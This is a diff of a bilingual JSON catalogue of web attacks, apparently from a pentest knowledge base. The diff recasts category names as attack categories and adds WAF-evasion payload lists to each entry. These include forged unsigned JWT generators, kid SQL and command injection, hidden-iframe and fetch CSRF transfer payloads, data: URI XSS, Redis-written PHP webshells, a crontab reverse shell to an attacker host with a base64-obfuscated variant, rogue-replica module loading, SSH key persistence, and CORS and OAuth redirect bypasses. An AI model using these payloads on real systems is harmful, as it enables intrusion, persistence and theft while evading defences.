@@ -154,8 +154,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "访问控制一致性",
-        "en": "Access-Control Consistency"
+        "zh": "路径、方法与可信头授权绕过",
+        "en": "Path, Method & Trusted-Header Authorization Bypass"
       },
       "tutorial": {
         "overview": {
@@ -264,8 +264,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "会话状态混淆",
-        "en": "Session State Confusion"
+        "zh": "会话与 Cookie 劫持",
+        "en": "Session & Cookie Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -336,6 +336,41 @@
       "tags": [
         "auth2",
         "session_puzzling"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "编码会话值",
+            "en": "Encoded Session Value"
+          },
+          "command": "session=YWRtaW4=\nsession=YWRtaW46dHJ1ZQ==",
+          "description": {
+            "zh": "绕过会话值明文 admin/true 特征检查：base64 编码后在解码层还原。成功判据：解码值被当作角色字段采信。",
+            "en": "Bypasses plaintext admin/true checks on session values by base64-encoding them. Success: the decoded value is honored as a role field."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套键注入",
+            "en": "Nested Key Injection"
+          },
+          "command": "session[role]=admin&session[isAdmin]=1&session[user]=admin",
+          "description": {
+            "zh": "对象化会话字段注入绕过标量校验。成功判据：嵌套 role/admin 键被解析并提权。",
+            "en": "Object-shaped session fields bypass scalar validation. Success: nested role/admin keys parse and escalate."
+          }
+        },
+        {
+          "title": {
+            "zh": "双通道会话覆盖",
+            "en": "Dual-Channel Session Override"
+          },
+          "command": "curl -sS --max-time 5 -b \"session=guest\" -d \"username=admin&session=admin\" http://127.0.0.1:8080/profile",
+          "description": {
+            "zh": "Cookie 与表单同时携带 session，取值优先级差异实现覆盖。成功判据：服务端采信表单中的 admin 值。",
+            "en": "Carrying session in both Cookie and form exploits extraction priority to override. Success: server honors the form's admin value."
+          }
+        }
       ]
     },
     {
@@ -446,7 +481,53 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Base64 封装内容",
+            "en": "Base64-embedded content"
+          },
+          "command": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+          "description": {
+            "zh": "绕过对明文 < 的检测：payload 整体 base64 化。判据：解码后执行弹窗。",
+            "en": "Base64-encodes the payload so no raw < appears. Success: decoded payload executes alert."
+          }
+        },
+        {
+          "title": {
+            "zh": "scheme 大小写混淆",
+            "en": "Scheme case obfuscation"
+          },
+          "command": "DATA:text/HTML,<svg onload=alert(1)>",
+          "description": {
+            "zh": "绕过小写 data: 前缀匹配：scheme 与 media type 大小写在浏览器中不敏感。判据：同样触发执行。",
+            "en": "Mixed-case scheme/media type still parses while breaking prefix rules. Success: payload still executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "URL 编码内容",
+            "en": "URL-encoded content"
+          },
+          "command": "data:text/html,%3Csvg%20onload=alert(1)%3E",
+          "description": {
+            "zh": "绕过明文标签检测：内容百分号编码。判据：解码后执行。",
+            "en": "Percent-encodes the body to avoid literal tag signatures. Success: executes after decoding."
+          }
+        },
+        {
+          "title": {
+            "zh": "charset 参数前缀",
+            "en": "charset parameter padding"
+          },
+          "command": "data:text/html;charset=utf-8,<img src=x onerror=alert(1)>",
+          "description": {
+            "zh": "绕过 data:text/html, 精确前缀匹配：插入 charset 参数改变字面形态。判据：执行成功。",
+            "en": "Inserts a charset parameter so exact-prefix rules on data:text/html, no longer match. Success: payload runs."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-get-based-csrf-via-img-script",
@@ -487,8 +568,8 @@
         "en": "CSRF Cross-Site Request Forgery"
       },
       "subCategory": {
-        "zh": "GET 状态变更",
-        "en": "State-Changing GET Requests"
+        "zh": "CSRF 载荷构造",
+        "en": "CSRF Payload Construction"
       },
       "tutorial": {
         "overview": {
@@ -559,6 +640,52 @@
       "tags": [
         "auth2",
         "get_based_csrf"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "隐藏 iframe 触发",
+            "en": "Hidden iframe trigger"
+          },
+          "command": "<iframe src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\" style=\"display:none\"></iframe>",
+          "description": {
+            "zh": "绕过 img 标签过滤：iframe 加载同样携带 Cookie。判据：转账请求到达且含会话。",
+            "en": "iframe loading carries cookies when img is filtered. Success: transfer request arrives with session."
+          }
+        },
+        {
+          "title": {
+            "zh": "fetch no-cors 触发",
+            "en": "fetch no-cors trigger"
+          },
+          "command": "<script>fetch('https://{TARGET}/api/transfer?to=attacker&amount=1000',{mode:'no-cors',credentials:'include'})</script>",
+          "description": {
+            "zh": "no-cors 模式静默发送凭据请求。判据：请求成功记录。",
+            "en": "Silent credentialed request in no-cors mode. Success: request recorded."
+          }
+        },
+        {
+          "title": {
+            "zh": "prefetch 预取触发",
+            "en": "prefetch trigger"
+          },
+          "command": "<link rel=\"prefetch\" href=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\">",
+          "description": {
+            "zh": "预取也会带 Cookie 发起 GET。判据：服务端日志出现预取请求。",
+            "en": "Prefetch also issues a credentialed GET. Success: prefetch hit in server logs."
+          }
+        },
+        {
+          "title": {
+            "zh": "URL 编码参数规避",
+            "en": "URL-encoded parameter evasion"
+          },
+          "command": "<img src=\"https://{TARGET}/api/transfer?to=%61ttacker&%61mount=1000\">",
+          "description": {
+            "zh": "参数值编码绕过 WAF 对明文参数的黑名单。判据：请求仍被服务端接受。",
+            "en": "Encoded values slip past WAF parameter blacklists. Success: request still accepted server-side."
+          }
+        }
       ]
     },
     {
@@ -600,8 +727,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "算法固定与签名验证",
-        "en": "Algorithm Pinning and Signature Verification"
+        "zh": "算法混淆与签名绕过",
+        "en": "Algorithm Confusion & Signature Bypass"
       },
       "tutorial": {
         "overview": {
@@ -672,7 +799,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：混合大小写算法名",
+            "en": "Header Mutation: Mixed-Case Algorithm"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'nOnE','typ':'JWT'})+'.'+e({'sub':'1','role':'admin'})+'.')\"",
+          "description": {
+            "zh": "绕过对 eyJhbGciOiJub25l 固定 base64 特征的 WAF：alg 值改 nOnE，多数库做小写归一后仍按 none 处理；成功判据：服务端接受无签名令牌。",
+            "en": "Bypasses WAFs matching the fixed eyJhbGciOiJub25l signature: alg 'nOnE' is normalized to none by most libs. Success: the server accepts the unsigned token."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：缺失 alg 字段",
+            "en": "Header Mutation: Missing alg Field"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'typ':'JWT'})+'.'+e({'sub':'1'})+'AA')\"",
+          "description": {
+            "zh": "头部完全不写 alg，部分库默认回退 none；成功判据：省略算法的令牌仍通过验证。",
+            "en": "Omits alg entirely; some libraries fall back to none. Success: the algorithm-less token still validates."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：附加字段混淆",
+            "en": "Header Mutation: Extra Field Padding"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT','cty':'JWT','kid':'k1'})+'.'+e({'sub':'1'})+'')\"",
+          "description": {
+            "zh": "头部塞入 cty/kid 等无害字段改变 base64 整体特征，保留 none 语义；成功判据：无签名令牌被接受。",
+            "en": "Pads the header with harmless cty/kid fields to change the base64 signature while keeping none semantics. Success: the unsigned token is accepted."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-jwt-kid",
@@ -713,8 +875,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "密钥标识符注入",
-        "en": "Key Identifier Injection"
+        "zh": "密钥与头部操纵",
+        "en": "Key & Header Manipulation"
       },
       "tutorial": {
         "overview": {
@@ -784,7 +946,42 @@
           "added-references",
           "defined-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：kid SQL 注入",
+            "en": "Header Mutation: kid SQL Injection"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h={'alg':'HS256','typ':'JWT','kid':chr(39)+' UNION SELECT '+chr(39)+'attacker_known_secret'+chr(39)+' -- '};print(e(h)+'.'+e({'sub':'1','role':'admin'}))\" # 签名密钥用 attacker_known_secret 重签",
+          "description": {
+            "zh": "绕过对路径穿越型 kid 的拦截：kid 走 SQL 注入把密钥选择固定到已知值；成功判据：用已知密钥签名的令牌通过验证。",
+            "en": "Bypasses traversal-style kid blocking by steering key selection to a known value via SQLi. Success: a token signed with the known secret validates."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：kid 命令注入",
+            "en": "Header Mutation: kid Command Injection"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h={'alg':'HS256','typ':'JWT','kid':'|id'};print(e(h)+'.'+e({'sub':'1'}))\"",
+          "description": {
+            "zh": "kid 传入 | 命令注入探针（shell_exec 型密钥加载场景），规避 ../../ 路径特征；成功判据：响应或日志出现命令执行痕迹。",
+            "en": "Probes command injection via kid (shell_exec key loading), avoiding ../../ path signatures. Success: command execution traces appear in the response or logs."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：kid 指向 URL",
+            "en": "Header Mutation: kid URL Reference"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h={'alg':'HS256','typ':'JWT','kid':'http://{ATTACKER_HOST}/keys/1'};print(e(h)+'.'+e({'sub':'1'}))\"",
+          "description": {
+            "zh": "kid 写远程 URL 诱导密钥拉取（JWKS 型实现），规避本地路径检测；成功判据：{ATTACKER_HOST} 收到密钥请求。",
+            "en": "Points kid at a remote URL to lure key fetching in JWKS-style implementations, evading local-path detection. Success: {ATTACKER_HOST} receives a key request."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-jwt-role-admin",
@@ -825,8 +1022,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "声明完整性",
-        "en": "Claim Integrity"
+        "zh": "令牌伪造与会话攻击",
+        "en": "Token Forgery & Session Attacks"
       },
       "tutorial": {
         "overview": {
@@ -895,7 +1092,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：两段式令牌",
+            "en": "Header Mutation: Two-Segment Token"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT'})+'.'+e({'user_id':1,'role':'admin'}))\"",
+          "description": {
+            "zh": "完全省略第三个点段（仅两段），绕过“必须三段”与空签名段两类校验；成功判据：两段令牌被接受且 role 生效。",
+            "en": "Drops the third segment entirely, evading both the must-have-three-segments and empty-signature checks. Success: the two-segment token is accepted and the role applies."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：占位签名与声明增补",
+            "en": "Header Mutation: Placeholder Signature with Extra Claims"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT'})+'.'+e({'user_id':1,'role':'admin','iss':'trusted','exp':9999999999})+'.AA')\"",
+          "description": {
+            "zh": "签名段以 AA 占位并增补 iss/exp 声明，改变 base64 特征的同时满足宽松校验；成功判据：令牌以 admin 权限通过。",
+            "en": "Uses an AA placeholder signature and adds iss/exp claims to alter the base64 signature while satisfying lenient checks. Success: the token passes with admin privileges."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：嵌套 JWT 伪装",
+            "en": "Header Mutation: Nested JWT Wrapper"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();inner=e({'alg':'none','typ':'JWT'})+'.'+e({'user_id':1,'role':'admin'});print(e({'alg':'none','typ':'JWT','nested':inner}))\"",
+          "description": {
+            "zh": "把伪造令牌藏进外层头部 nested 字段（双击解包型实现），规避对 payload 直接含 role 的检测；成功判据：实现解包后接受内层令牌。",
+            "en": "Hides the forged token in a nested header field for unwrap-style implementations, evading direct role-in-payload detection. Success: the impl unwraps and accepts the inner token."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-jwt-rsa-hmac",
@@ -936,8 +1168,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "算法混淆",
-        "en": "Algorithm Confusion"
+        "zh": "算法混淆与签名绕过",
+        "en": "Algorithm Confusion & Signature Bypass"
       },
       "tutorial": {
         "overview": {
@@ -1004,7 +1236,42 @@
           "added-references",
           "defined-false-positive"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：HS512 混淆变体",
+            "en": "Header Mutation: HS512 Confusion Variant"
+          },
+          "command": "python3 -c \"import base64,json,hmac,hashlib;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h=e({'alg':'HS512','typ':'JWT'});p=e({'user_id':1,'role':'admin'});k=open('pub.pem','rb').read();s=base64.urlsafe_b64encode(hmac.new(k,(h+'.'+p).encode(),hashlib.sha512).digest()).rstrip(b'=').decode();print(h+'.'+p+'.'+s)\"",
+          "description": {
+            "zh": "算法改 HS512 并以公钥为 HMAC 密钥重签，规避仅拦截 HS256 头部的规则；成功判据：服务端把令牌当有效 RS512 处理。",
+            "en": "Switches to HS512 signed with the public key to evade rules blocking only HS256 headers. Success: the server treats the token as a valid RS-family token."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：内嵌 JWK 公钥变体",
+            "en": "Header Mutation: Embedded JWK Variant"
+          },
+          "command": "python3 -c \"import base64,json,hmac,hashlib;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();pub=open('pub.pem').read();h=e({'alg':'HS256','typ':'JWT','jwk':{'kty':'oct','k':base64.urlsafe_b64encode(pub.encode()).rstrip(b'=').decode()}});p=e({'sub':'1','role':'admin'});s=base64.urlsafe_b64encode(hmac.new(pub.encode(),(h+'.'+p).encode(),hashlib.sha256).digest()).rstrip(b'=').decode();print(h+'.'+p+'.'+s)\"",
+          "description": {
+            "zh": "公钥作为 oct JWK 内嵌头部并同时充当 HMAC 密钥，规避外部密钥依赖型检测；成功判据：验证器用内嵌密钥通过校验。",
+            "en": "Embeds the public key as an oct JWK while using it as the HMAC secret, evading external-key-dependency detection. Success: the verifier passes using the embedded key."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：算法数组变体",
+            "en": "Header Mutation: Algorithm Array Variant"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':['RS256','HS256'],'typ':'JWT'})+'.'+e({'sub':'1'})+'.')\"",
+          "description": {
+            "zh": "alg 写成数组，部分库取最后一个元素，绕过期望单值的头部校验；成功判据：按 HS256 语义处理令牌。",
+            "en": "alg as an array makes some libs take the last element, evading single-value header validation. Success: the token is processed with HS256 semantics."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-redis-webshell",
@@ -1045,8 +1312,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Redis 文件写入",
-        "en": "Redis File Write"
+        "zh": "组件与服务 RCE",
+        "en": "Component & Service RCE"
       },
       "tutorial": {
         "overview": {
@@ -1118,7 +1385,42 @@
           "redis-pentest",
           "web-shell-payloads"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "内联命令协议变体",
+            "en": "Inline Command Protocol Variant"
+          },
+          "command": "SET webshell \"<?php @eval($_POST['cmd']);?>\"\nCONFIG SET dir /var/www/html\nCONFIG SET dbfilename shell.php\nSAVE",
+          "description": {
+            "zh": "绕过对 RESP *3/$3 特征串的检测：改用内联命令行协议写入；成功判据：web 目录出现可连接的 shell.php。",
+            "en": "Avoids RESP *3/$3 signature strings by using inline protocol commands. Success: a working shell.php appears in the web root."
+          }
+        },
+        {
+          "title": {
+            "zh": "RDB 持久化落盘变体",
+            "en": "RDB Persistence Variant"
+          },
+          "command": "SET pwn \"\\n<?php system($_GET['c']);?>\\n\"\nCONFIG SET dir /var/www/html\nCONFIG SET dbfilename x.php\nBGSAVE",
+          "description": {
+            "zh": "把 payload 值注入脏数据并借 RDB 快照落盘为 PHP 文件，避开 RESP 长度前缀特征；成功判据：GET x.php 触发解析。",
+            "en": "Plants the payload in a dirty key and abuses RDB snapshotting to drop a PHP file, avoiding RESP length-prefix signatures. Success: requesting x.php triggers code parsing."
+          }
+        },
+        {
+          "title": {
+            "zh": "主从复制模块加载变体",
+            "en": "Replica Module Load Variant"
+          },
+          "command": "SLAVEOF {ATTACKER_HOST} 6379\nCONFIG SET dir /tmp\nCONFIG SET dbfilename exp.so\nMODULE LOAD /tmp/exp.so\nsystem.exec 'id'",
+          "description": {
+            "zh": "绕过文件内容检测：通过主从同步传输 .so 模块并加载执行系统命令；成功判据：system.exec 返回 uid 输出。",
+            "en": "Evades file-content inspection by syncing a .so module via replication and loading it. Success: system.exec returns uid output."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-redis-crontab",
@@ -1159,8 +1461,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Redis Cron 文件写入",
-        "en": "Redis Cron File Write"
+        "zh": "组件与服务 RCE",
+        "en": "Component & Service RCE"
       },
       "tutorial": {
         "overview": {
@@ -1232,7 +1534,42 @@
           "redis-pentest",
           "persistence-techniques"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "内联 crontab 写入",
+            "en": "Inline crontab Write"
+          },
+          "command": "SET crontab \"\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1\\n\\n\"\nCONFIG SET dir /var/spool/cron\nCONFIG SET dbfilename root\nSAVE",
+          "description": {
+            "zh": "绕过 RESP 协议特征：内联命令写入 crontab 并持久化；成功判据：{LPORT} 收到反弹连接。",
+            "en": "Avoids RESP protocol signatures using inline commands to write and persist a crontab. Success: reverse shell hits {LPORT}."
+          }
+        },
+        {
+          "title": {
+            "zh": "SSH 公钥持久化变体",
+            "en": "SSH Authorized Keys Variant"
+          },
+          "command": "SET sshkey \"\\n\\nssh-rsa AAAA...{ATTACKER_PUBKEY}\\n\\n\"\nCONFIG SET dir /root/.ssh\nCONFIG SET dbfilename authorized_keys\nSAVE",
+          "description": {
+            "zh": "换持久化面：写 authorized_keys 绕过 crontab 关键词检测；成功判据：ssh root@target 免密登录成功。",
+            "en": "Switches persistence surface to authorized_keys, evading crontab keyword detection. Success: passwordless SSH login succeeds."
+          }
+        },
+        {
+          "title": {
+            "zh": "Base64 反弹载荷变体",
+            "en": "Base64 Payload Variant"
+          },
+          "command": "SET b64cron \"\\n\\n*/1 * * * * echo YmFzaCAtaSA+JiAvZGV2L3RjcC97QVRUQUNLRVJfSE9TVH0ve0xQT1JUfSAwPiYx|base64 -d|bash\\n\\n\"\nCONFIG SET dir /var/spool/cron/crontabs\nCONFIG SET dbfilename root\nSAVE",
+          "description": {
+            "zh": "反弹命令整体 base64 编码，规避 /dev/tcp 特征；成功判据：{LPORT} 收到定时回连。",
+            "en": "Base64-encodes the reverse shell to evade /dev/tcp signatures. Success: periodic callbacks arrive at {LPORT}."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-hash",
@@ -1385,8 +1722,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "CORS Origin 校验",
-        "en": "CORS Origin Validation"
+        "zh": "CORS 跨源配置攻击",
+        "en": "CORS Misconfiguration Attacks"
       },
       "tutorial": {
         "overview": {
@@ -1454,7 +1791,42 @@
           "added-references",
           "defined-browser-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "大小写与编码 Origin",
+            "en": "Case & Encoded Origin"
+          },
+          "command": "Origin: HTTPS://{ATTACKER_HOST}\nOrigin: https://%41ttacker.example.invalid\nOrigin: https://{ATTACKER_HOST}.",
+          "description": {
+            "zh": "大小写、编码与尾点变形绕过精确字符串匹配。成功判据：任一形态反射进 ACAO 头。",
+            "en": "Case, encoding, and trailing-dot mutations evade exact-string matching. Success: any form is reflected into the ACAO header."
+          }
+        },
+        {
+          "title": {
+            "zh": "端口后缀绕过",
+            "en": "Port Suffix Bypass"
+          },
+          "command": "Origin: https://{ATTACKER_HOST}:443\nOrigin: https://{ATTACKER_HOST}:8443\nOrigin: https://{TARGET}:1337",
+          "description": {
+            "zh": "显式端口与白名单默认端口语义等价但字符串不同。成功判据：带端口 Origin 被放行反射。",
+            "en": "Explicit ports are semantically equal to allowlisted defaults but differ as strings. Success: the ported Origin is allowed and reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "双 Origin 头",
+            "en": "Duplicate Origin Headers"
+          },
+          "command": "printf 'GET /api/data HTTP/1.1\\r\\nHost: {TARGET}\\r\\nOrigin: https://good.example.invalid\\r\\nOrigin: https://{ATTACKER_HOST}\\r\\nConnection: close\\r\\n\\r\\n' | nc {TARGET} 443",
+          "description": {
+            "zh": "重复 Origin 头使校验取可信值、反射取攻击者值。成功判据：ACAO 反射攻击者域。",
+            "en": "Duplicate Origin headers let validation read trusted while reflection reads attacker. Success: ACAO reflects the attacker origin."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-referer",
@@ -1495,8 +1867,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Referer 访问控制",
-        "en": "Referer-Based Access Control"
+        "zh": "路径、方法与可信头授权绕过",
+        "en": "Path, Method & Trusted-Header Authorization Bypass"
       },
       "tutorial": {
         "overview": {
@@ -1564,7 +1936,42 @@
           "added-references",
           "defined-false-positive"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "同站路径伪装",
+            "en": "Same-Site Path Spoof"
+          },
+          "command": "curl -sS --max-time 5 -H \"Referer: https://{TARGET}/admin/\" http://{TARGET}/admin/",
+          "description": {
+            "zh": "伪造目标自身域名路径绕过来源白名单。成功判据：受保护内容返回。",
+            "en": "Forges the target's own domain to satisfy the referer allowlist. Success: protected content returns."
+          }
+        },
+        {
+          "title": {
+            "zh": "查询子串命中",
+            "en": "Query-Substring Hit"
+          },
+          "command": "curl -sS --max-time 5 -H \"Referer: https://{ATTACKER_HOST}/?next={TARGET}\" http://{TARGET}/admin/",
+          "description": {
+            "zh": "绕过 contains 型白名单匹配：攻击者 URL 中嵌入目标域子串。成功判据：授权放行。",
+            "en": "Bypasses contains-style allowlists by embedding the target domain inside the attacker URL. Success: authorization passes."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与编码组合",
+            "en": "Case & Encoding Combo"
+          },
+          "command": "curl -sS --max-time 5 -H \"REFERER: https://%74arget.example.invalid/admin\" http://{TARGET}/admin/",
+          "description": {
+            "zh": "头名大写加值编码双重变形绕过特征匹配。成功判据：来源校验通过。",
+            "en": "Uppercase header name plus encoded value double mutation evades signature matching. Success: origin validation passes."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-token",
@@ -1605,8 +2012,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Token 输入校验",
-        "en": "Token Input Validation"
+        "zh": "JWT 算法与令牌强度",
+        "en": "JWT Algorithms & Token Strength"
       },
       "tutorial": {
         "overview": {
@@ -1674,7 +2081,42 @@
           "added-references",
           "defined-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双键覆盖置空",
+            "en": "Duplicate-Key Nullify"
+          },
+          "command": "{\"token\":\"VALID\",\"token\":null}\n{\"token\":null,\"token\":\"VALID\"}",
+          "description": {
+            "zh": "键顺序不同的空值覆盖探测解析与校验分离。成功判据：null 值实例被采信进入认证。",
+            "en": "Varying key order with a null override probes parse/validate separation. Success: the null instance reaches authentication."
+          }
+        },
+        {
+          "title": {
+            "zh": "数组形态令牌",
+            "en": "Array-Form Token"
+          },
+          "command": "token[]=VALID_TOKEN&token[]=",
+          "description": {
+            "zh": "数组化令牌绕过标量校验与 WAF token 特征。成功判据：数组首元素被采信。",
+            "en": "Array-shaped tokens bypass scalar validation and token signatures. Success: the first array element is honored."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码空值",
+            "en": "Encoded Null Value"
+          },
+          "command": "token=%00\ntoken=%20\ntoken=%2500",
+          "description": {
+            "zh": "NUL 与空白编码形态绕过空值检查与黑名单。成功判据：非标准空值通过校验。",
+            "en": "NUL and whitespace encodings bypass empty-value checks and blacklists. Success: the non-standard empty value validates."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-web-attack-cheat-sheet-35",
@@ -1833,8 +2275,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "综合 JWT 验证",
-        "en": "Comprehensive JWT Validation"
+        "zh": "密钥与头部操纵",
+        "en": "Key & Header Manipulation"
       },
       "tutorial": {
         "overview": {
@@ -1902,7 +2344,42 @@
           "added-references",
           "defined-test-isolation"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：重复键 alg 覆盖",
+            "en": "Header Mutation: Duplicate alg Key Override"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();q=chr(34);h=e({'alg':'RS256','typ':'JWT'});h=h[:-1]+','+q+'alg'+q+':'+q+'none'+q+'}';print(h+'.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.')\"",
+          "description": {
+            "zh": "头部写两个 alg 键（RS256 在前 none 在后），不同 JSON 解析器取值不同，绕过头部静态校验；成功判据：任一解析路径按 none 接受。",
+            "en": "Two alg keys make parsers disagree (first vs last), bypassing static header validation. Success: some parse path accepts it as none."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：base64 填充差异",
+            "en": "Header Mutation: base64 Padding Difference"
+          },
+          "command": "python3 -c \"import base64,json;print(base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode()+'.'+base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).decode()+'.'+'')\"",
+          "description": {
+            "zh": "各段保留 = 填充（非规范 base64url），改变整串特征并测试实现的宽容解码；成功判据：带填充令牌仍通过验证。",
+            "en": "Keeps = padding on segments (non-canonical base64url) to alter the signature and probe lenient decoding. Success: the padded token still validates."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：键序交换",
+            "en": "Header Mutation: Key Order Swap"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'typ':'JWT','alg':'nOnE'})+'.'+e({'role':'admin','sub':'1'})+'')\"",
+          "description": {
+            "zh": "typ/alg 键序交换且 alg 大小写变形，规避固定键序 base64 特征（eyJhbGciOiJub25lIiwidHlw 前缀）；成功判据：令牌按 none 语义接受。",
+            "en": "Swaps key order and mutates alg case to evade the fixed-order eyJhbGciOiJub25lIiwidHlw prefix signature. Success: the token is accepted with none semantics."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-redirect-uri",
@@ -1943,8 +2420,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "OAuth 回调操纵",
-        "en": "OAuth Callback Manipulation"
+        "zh": "OAuth 与 OIDC 流程攻击",
+        "en": "OAuth & OIDC Flow Attacks"
       },
       "tutorial": {
         "overview": {
@@ -2012,7 +2489,42 @@
           "added-references",
           "defined-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双斜杠与编码组合",
+            "en": "Double Slash & Encoding Combo"
+          },
+          "command": "redirect_uri=https:////{ATTACKER_HOST}/callback\nredirect_uri=https%3A%2F%2F%2F%2F{ATTACKER_HOST}%2Fcallback",
+          "description": {
+            "zh": "绕过按标准单斜杠匹配的白名单：解析器容错接受多斜杠。成功判据：授权码发往攻击者域。",
+            "en": "Bypasses single-slash allowlist matching since tolerant parsers accept extra slashes. Success: the code is issued to the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码片段后缀",
+            "en": "Encoded Fragment Suffix"
+          },
+          "command": "redirect_uri=https://{ATTACKER_HOST}/callback%23\nredirect_uri=https://{ATTACKER_HOST}/callback%3F",
+          "description": {
+            "zh": "编码 #/? 尾缀在规范化层剥离，白名单比对与实际跳转分离。成功判据：比对通过且跳转到攻击者域。",
+            "en": "Encoded #/? suffixes strip at normalization, splitting allowlist comparison from the actual redirect. Success: comparison passes and the redirect hits the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "userinfo 前缀伪装",
+            "en": "Userinfo Prefix Disguise"
+          },
+          "command": "redirect_uri=https://client.example.invalid@{ATTACKER_HOST}/callback",
+          "description": {
+            "zh": "@ 前的合法域欺骗前缀匹配，实际主机为攻击者。成功判据：授权码发往 {ATTACKER_HOST}。",
+            "en": "The legit domain before @ fools prefix matching while the real host is the attacker's. Success: the code goes to {ATTACKER_HOST}."
+          }
+        }
+      ]
     },
     {
